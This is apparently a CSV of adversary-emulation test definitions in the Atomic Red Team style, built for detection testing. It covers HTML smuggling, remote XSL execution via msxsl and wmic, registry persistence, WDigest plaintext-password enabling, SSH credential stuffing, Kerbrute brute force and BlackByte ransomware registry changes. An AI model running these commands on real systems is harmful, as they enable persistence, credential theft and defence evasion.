attack_technique,display_name,name,auto_generated_guid,description,supported_platforms.0,supported_platforms.1,supported_platforms.2,executor.command,executor.name,executor.elevation_required,executor.steps,executor.cleanup_command,dependency_executor_name,dependencies,input_arguments
T1027.006,HTML Smuggling,HTML Smuggling Remote Payload,30cbeda4-08d9-42f1-8685-197fad677734,"The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso) without user interaction. 
The HTML file is based off of the work from [Stan Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)
",windows,,,"& ""PathToAtomicsFolder\T1027.006\bin\T1027_006_remote.html""
",powershell,False,,$user = [System.Environment]::UserName; Remove-Item -Path C:\Users\$user\Downloads\FeelTheBurn.iso -ErrorAction Ignore,,"dependencies.0.description: T1027_006_remote.html must exist on disk at specified at PathToAtomicsFolder\T1027.006\bin\T1027_006_Remote.html

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\T1027.006\bin\T1027_006_Remote.html"") { exit 0} else { exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1027.006\bin\"" -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html"" -OutFile ""PathToAtomicsFolder\T1027.006\bin\T1027_006_Remote.html""

",
T1021.005,Remote Services:VNC,Enable Apple Remote Desktop Agent,8a930abe-841c-4d4f-a877-72e9fe90b9ea,"ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. 
Adversaries can abuse ARD to gain remote code execution and perform lateral movement.

References:  https://www.mandiant.com/resources/blog/leveraging-apple-remote-desktop-for-good-and-evil
",macos,,,"sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet
",sh,True,,"sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop -configure -privs -none -quiet
",,,
T1007,System Service Discovery,System Service Discovery,89676ba1-b1f8-47ee-b940-2e1a113ebc71,"Identify system services.

Upon successful execution, cmd.exe will execute service commands with expected result to stdout.
",windows,,,"tasklist.exe
sc query
sc query state= all
",command_prompt,True,,,,,
T1007,System Service Discovery,System Service Discovery - net.exe,5f864a3f-8ce9-45c0-812c-bdf7d8aeacc3,"Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.

Upon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in in the temp directory called service-list.txt.
",windows,,,"net.exe start >> #{output_file}
",command_prompt,,,"del /f /q /s #{output_file} >nul 2>&1
",,,"input_arguments.output_file.description: Path of file to hold net.exe output

input_arguments.output_file.type: path

input_arguments.output_file.default: %temp%\service-list.txt

"
T1007,System Service Discovery,System Service Discovery - systemctl/service,f4b26bce-4c2c-46c0-bcc5-fce062d38bef,"Enumerates system service using systemctl/service
",linux,,,"if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
",bash,,,,,,
T1547.014,Active Setup,HKLM - Add atomic_test key to launch executable as part of user setup,deff4586-0517-49c2-981d-bbea24d48d71,"This test will create an ""atomic_test"" key under 'HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components' to launch calc by configuring an active setup executable and 
forcing to run active setup using the ""runonce.exe /AlternateShellStartup"" command. 
Without the ""runonce.exe /AlternateShellStartup"" command it would run during the next logon for each user.

Note: If you logout before running the cleanup command, you will be required to go through the OOBE (out-of-box experience) setup sequence to log back in. 
The payload will only run once unless the cleanup command is run in between tests.

[Active Setup Explained](https://helgeklein.com/blog/active-setup-explained/)
",windows,,,"New-Item ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components"" -Name ""atomic_test"" -Force
Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" ""(Default)"" ""ART TEST"" -Force
Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" ""StubPath"" ""#{payload}"" -Force 
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup",powershell,True,,"Remove-Item ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" -Force -ErrorAction Ignore
Remove-Item ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" -Force -ErrorAction Ignore",,,"input_arguments.payload.description: Payload to run once during login

input_arguments.payload.type: string

input_arguments.payload.default: C:\Windows\System32\calc.exe

"
T1547.014,Active Setup,HKLM - Add malicious StubPath value to existing Active Setup Entry,39e417dd-4fed-4d9c-ae3a-ba433b4d0e9a,"This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) 
Said key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. 
Without the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.
",windows,,,"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" ""StubPath"" ""#{payload}"" -Force
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup",powershell,True,,"Remove-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""StubPath"" -Force
Remove-ItemProperty ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Force",,,"input_arguments.payload.description: Payload to run once during login

input_arguments.payload.type: string

input_arguments.payload.default: C:\Windows\System32\calc.exe

"
T1547.014,Active Setup,HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number,04d55cef-f283-40ba-ae2a-316bc3b5e78c,"This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, 
which will force the StubPath payload (if set) to execute.
",windows,,,"Set-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Value ""0,0,0,0""
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
",powershell,True,,,,,
T1546.010,Event Triggered Execution: AppInit DLLs,Install AppInit Shim,a58d9386-3080-4242-ab5f-454c16503d18,"AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, 
you will see the message ""The operation completed successfully."" Each time the DLL is loaded, you will see a message box with a message of ""Install AppInit Shim DLL was called!"" appear.
This will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the 
AppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.

Note: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls
",windows,,,"reg.exe import ""#{registry_file}""
",command_prompt,True,,"reg.exe import ""#{registry_cleanup_file}"" >nul 2>&1
",powershell,"dependencies.0.description: Reg files must exist on disk at specified locations (#{registry_file} and #{registry_cleanup_file})

dependencies.0.prereq_command: if ((Test-Path ""#{registry_file}"") -and (Test-Path ""#{registry_cleanup_file}"")) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory (split-path ""#{registry_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg"" -OutFile ""#{registry_file}""
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg"" -OutFile ""#{registry_cleanup_file}""

dependencies.1.description: DLL's must exist in the C:\Tools directory (T1546.010.dll and T1546.010x86.dll)

dependencies.1.prereq_command: if ((Test-Path c:\Tools\T1546.010.dll) -and (Test-Path c:\Tools\T1546.010x86.dll)) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory C:\Tools -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll"" -OutFile C:\Tools\T1546.010.dll
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll"" -OutFile C:\Tools\T1546.010x86.dll

","input_arguments.registry_file.description: Windows Registry File

input_arguments.registry_file.type: path

input_arguments.registry_file.default: PathToAtomicsFolder\T1546.010\src\T1546.010.reg

input_arguments.registry_cleanup_file.description: Windows Registry File

input_arguments.registry_cleanup_file.type: path

input_arguments.registry_cleanup_file.default: PathToAtomicsFolder\T1546.010\src\T1546.010-cleanup.reg

"
T1110.004,Brute Force: Credential Stuffing,SSH Credential Stuffing From Linux,4f08197a-2a8a-472d-9589-cd2895ef22ad,"Using username,password combination from a password dump to login over SSH.
",linux,,,"cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done
",bash,False,,,bash,"dependencies.0.description: Requires SSHPASS

dependencies.0.prereq_command: if [ -x ""$(command -v sshpass)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; else echo ""This test requires sshpass"" ; fi ;

","input_arguments.target_host.description: IP Address / Hostname you want to target.

input_arguments.target_host.type: string

input_arguments.target_host.default: localhost

"
T1110.004,Brute Force: Credential Stuffing,SSH Credential Stuffing From MacOS,d546a3d9-0be5-40c7-ad82-5a7d79e1b66b,"Using username,password combination from a password dump to login over SSH.
",macos,,,"cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done
",bash,False,,,bash,"dependencies.0.description: Requires SSHPASS

dependencies.0.prereq_command: if [ -x ""$(command -v sshpass)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: /bin/bash -c ""$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/e8114640740938c20cc41ffdbf07816b428afc49/install.sh)""
brew install hudochenkov/sshpass/sshpass

","input_arguments.target_host.description: IP Address / Hostname you want to target.

input_arguments.target_host.type: string

input_arguments.target_host.default: localhost

"
T1110.004,Brute Force: Credential Stuffing,SSH Credential Stuffing From FreeBSD,a790d50e-7ebf-48de-8daa-d9367e0911d4,"Using username,password combination from a password dump to login over SSH.
",linux,,,"cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done
",sh,False,,,sh,"dependencies.0.description: Requires SSHPASS

dependencies.0.prereq_command: if [ -x ""$(command -v sshpass)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: pkg install -y sshpass

","input_arguments.target_host.description: IP Address / Hostname you want to target.

input_arguments.target_host.type: string

input_arguments.target_host.default: localhost

"
T1110.004,Brute Force: Credential Stuffing,Brute Force:Credential Stuffing using Kerbrute Tool,4852c630-87a9-409b-bb5e-5dc12c9ebcde,"Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack
",windows,,,"cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} ""PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt""      
",powershell,False,,,powershell,"dependencies.0.description: kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads

dependencies.0.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe""){exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe""

dependencies.1.description: bruteforce.txt must exist in PathToAtomicsFolder\..\ExternalPayloads

dependencies.1.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt""){exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/src/bruteforce.txt?raw=true"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt""

","input_arguments.domaincontroller.description: Domain controller where test will be run

input_arguments.domaincontroller.type: string

input_arguments.domaincontroller.default: $ENV:userdnsdomain

input_arguments.domain.description: Domain where you will be testing

input_arguments.domain.type: string

input_arguments.domain.default: $ENV:userdomain

"
T1133,External Remote Services,Running Chrome VPN Extensions via the Registry 2 vpn extension,4c8db261-a58b-42a6-a866-0a294deedde4,"Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see ""T1133\src\list of vpn extension.txt"" to view complete list
",windows,,,"$extList = #{extension_id}
foreach ($extension in $extList) {
  New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
  New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name ""update_url"" -Value ""https://clients2.google.com/service/update2/crx"" -PropertyType ""String"" -Force}
Start chrome
Start-Sleep -Seconds 30
Stop-Process -Name ""chrome""
",powershell,True,,"$extList = #{extension_id}
foreach ($extension in $extList) {
Remove-Item -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -ErrorAction Ignore}
",powershell,"dependencies.0.description: Chrome must be installed

dependencies.0.prereq_command: if ((Test-Path ""C:\Program Files\Google\Chrome\Application\chrome.exe"") -Or (Test-Path ""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"")) {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.exe"" #{chrome_url}
Start-Process ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.exe"" /S

","input_arguments.chrome_url.description: chrome installer download URL

input_arguments.chrome_url.type: url

input_arguments.chrome_url.default: https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe

input_arguments.extension_id.description: chrome extension id

input_arguments.extension_id.type: string

input_arguments.extension_id.default: ""fcfhplploccackoneaefokcmbjfbkenj"", ""fdcgdnkidjaadafnichfpabhfomcebme""


"
T1220,XSL Script Processing,MSXSL Bypass using local files,ca23bfb2-023f-49c5-8802-e66997de462d,"Executes the code specified within a XSL script tag during XSL transformation using a local payload. 
Requires download of MSXSL. No longer available from Microsoft.
(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) 
Open Calculator.exe when test successfully executed, while AV turned off.
",windows,,,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}""
",command_prompt,,,"del ""#{msxsl_exe}"" >nul 2>&1
",powershell,"dependencies.0.description: XML file must exist on disk at specified location (#{xmlfile})

dependencies.0.prereq_command: if (Test-Path ""#{xmlfile}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{xmlfile}"") -ErrorAction Ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml"" -OutFile ""#{xmlfile}""

dependencies.1.description: XSL file must exist on disk at specified location (#{xslfile})

dependencies.1.prereq_command: if (Test-Path ""#{xslfile}"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory (split-path ""#{xslfile}"") -ErrorAction Ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl"" -OutFile ""#{xslfile}""

dependencies.2.description: msxsl.exe must exist on disk at specified location (#{msxsl_exe})

dependencies.2.prereq_command: if (Test-Path ""#{msxsl_exe}"") {exit 0} else {exit 1}

dependencies.2.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe"" -OutFile ""#{msxsl_exe}""

","input_arguments.xmlfile.description: Location of the test XML file on the local filesystem.

input_arguments.xmlfile.type: path

input_arguments.xmlfile.default: PathToAtomicsFolder\T1220\src\msxslxmlfile.xml

input_arguments.xslfile.description: Location of the test XSL script file on the local filesystem.

input_arguments.xslfile.type: path

input_arguments.xslfile.default: PathToAtomicsFolder\T1220\src\msxslscript.xsl

input_arguments.msxsl_exe.description: Location of the MSXSL executable.

input_arguments.msxsl_exe.type: path

input_arguments.msxsl_exe.default: PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe

"
T1220,XSL Script Processing,MSXSL Bypass using remote files,a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985,"Executes the code specified within a XSL script tag during XSL transformation using a remote payload.
Requires download of MSXSL.exe. No longer available from Microsoft.
(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )
Open Calculator.exe when test successfully executed, while AV turned off.
",windows,,,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}""
",command_prompt,,,"del -Path #{msxsl_exe} >nul 2>&1
",powershell,"dependencies.0.description: msxsl.exe must exist on disk at specified location (""#{msxsl_exe}"")

dependencies.0.prereq_command: if (Test-Path ""#{msxsl_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Invoke-WebRequest ""https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe"" -OutFile ""#{msxsl_exe}""

","input_arguments.xmlfile.description: Remote location (URL) of the test XML file.

input_arguments.xmlfile.type: url

input_arguments.xmlfile.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml

input_arguments.xslfile.description: Remote location (URL) of the test XSL script file.

input_arguments.xslfile.type: url

input_arguments.xslfile.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl

input_arguments.msxsl_exe.description: Location of the MSXSL executable.

input_arguments.msxsl_exe.type: path

input_arguments.msxsl_exe.default: PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe

"
T1220,XSL Script Processing,WMIC bypass using local XSL file,1b237334-3e21-4a0c-8178-b8c996124988,"Executes the code specified within a XSL script using a local payload.
",windows,,,"wmic #{wmic_command} /FORMAT:""#{local_xsl_file}""
",command_prompt,,,,powershell,"dependencies.0.description: XSL file must exist on disk at specified location (#{local_xsl_file})

dependencies.0.prereq_command: if (Test-Path ""#{local_xsl_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{local_xsl_file}"") -ErrorAction Ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl"" -OutFile ""#{local_xsl_file}""

","input_arguments.wmic_command.description: WMI command to execute using wmic.exe

input_arguments.wmic_command.type: string

input_arguments.wmic_command.default: process list

input_arguments.local_xsl_file.description: Location of the test XSL script file on the local filesystem.

input_arguments.local_xsl_file.type: path

input_arguments.local_xsl_file.default: PathToAtomicsFolder\T1220\src\wmicscript.xsl

"
T1220,XSL Script Processing,WMIC bypass using remote XSL file,7f5be499-33be-4129-a560-66021f379b9b,"Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.
",windows,,,"wmic #{wmic_command} /FORMAT:""#{remote_xsl_file}""
",command_prompt,,,,,,"input_arguments.remote_xsl_file.description: Remote location of an XSL payload.

input_arguments.remote_xsl_file.type: url

input_arguments.remote_xsl_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl

input_arguments.wmic_command.description: WMI command to execute using wmic.exe

input_arguments.wmic_command.type: string

input_arguments.wmic_command.default: process list

"
T1112,Modify Registry,Modify Registry of Current User Profile - cmd,1324796b-d0f6-455a-b4ae-21ffee6aa6b9,"Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message ""The operation completed successfully.""
will be displayed. Additionally, open Registry Editor to view the new entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced.
",windows,,,"reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
",command_prompt,,,"reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /f >nul 2>&1
",,,
T1112,Modify Registry,Modify Registry of Local Machine - cmd,282f929a-6bc5-42b8-bd93-960c3ba35afe,"Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when
CMD is ran as Administrative rights. Upon execution, the message ""The operation completed successfully.""
will be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
",windows,,,"reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f
",command_prompt,True,,"reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /f >nul 2>&1
",,,"input_arguments.new_executable.description: New executable to run on startup instead of Windows Defender

input_arguments.new_executable.type: string

input_arguments.new_executable.default: calc.exe

"
T1112,Modify Registry,Modify registry to store logon credentials,c0413fb5-33e2-40b7-9b6f-60b29f4a7a18,"Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).
Upon execution, the message ""The operation completed successfully."" will be displayed.
Additionally, open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.
",windows,,,"reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1
",,,
T1112,Modify Registry,Add domain to Trusted sites Zone,cf447677-5a4e-4937-a82c-e47d254afd57,"Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.
Upon execution, details of the new registry entries will be displayed.
Additionally, open Registry Editor to view the modified entry in HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\.

https://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf
",windows,,,"$key= ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\""
$name =""bad-subdomain""
new-item $key -Name $name -Force
new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
",powershell,,,"$key = ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\""
Remove-item  $key -Recurse -ErrorAction Ignore
",,,"input_arguments.bad_domain.description: Domain to add to trusted site zone

input_arguments.bad_domain.type: string

input_arguments.bad_domain.default: bad-domain.com

"
T1112,Modify Registry,Javascript in registry,15f44ea9-4571-4837-be9e-802431a7bfae,"Upon execution, a javascript block will be placed in the registry for persistence.
Additionally, open Registry Editor to view the modified entry in HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings.
",windows,,,"New-ItemProperty ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" -Name T1112 -Value ""<script>""
",powershell,,,"Remove-ItemProperty ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" -Name T1112 -ErrorAction Ignore
",,,
T1112,Modify Registry,Change Powershell Execution Policy to Bypass,f3a6cceb-06c9-48e5-8df8-8867a6814245,"Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.
They can either specify it during the execution of the powershell script or change the registry value for it.
",windows,,,"Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
",powershell,,,"try { Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy} -Scope LocalMachine -Force } catch {}
",,,"input_arguments.default_execution_policy.description: Specify the default poweshell execution policy

input_arguments.default_execution_policy.type: string

input_arguments.default_execution_policy.default: Default

"
T1112,Modify Registry,BlackByte Ransomware Registry Changes - CMD,4f4e2f9f-6209-4fcf-9b15-3b7455706f5b,"This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See ""Preparing to Worm"" section: https://redcanary.com/blog/blackbyte-ransomware/
The steps are as follows:
<ol>
    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>
    <li>2. Enable OS to share network connections between different privilege levels</li>
    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>
</ol>
The registry keys and their respective values will be created upon successful execution.
",windows,,,"cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f
cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLinkedConnections /f >nul 2>&1
reg delete HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\ /v LongPathsEnabled /f >nul 2>&1
",,,
T1112,Modify Registry,BlackByte Ransomware Registry Changes - Powershell,0b79c06f-c788-44a2-8630-d69051f1123d,"This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See ""Preparing to Worm"" section: https://redcanary.com/blog/blackbyte-ransomware/
The steps are as follows:
<ol>
    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>
    <li>2. Enable OS to share network connections between different privilege levels</li>
    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>
</ol>
The registry keys and their respective values will be created upon successful execution.
",windows,,,"New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
New-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem"" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force
",powershell,True,,"Remove-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore
Remove-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name EnableLinkedConnections -Force -ErrorAction Ignore
Remove-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem"" -Name LongPathsEnabled -Force -ErrorAction Ignore
",,,
T1112,Modify Registry,Disable Windows Registry Tool,ac34b0f7-0f85-4ac0-b93e-3ced2bc69bb8,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.
See example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry
",windows,,,"reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f
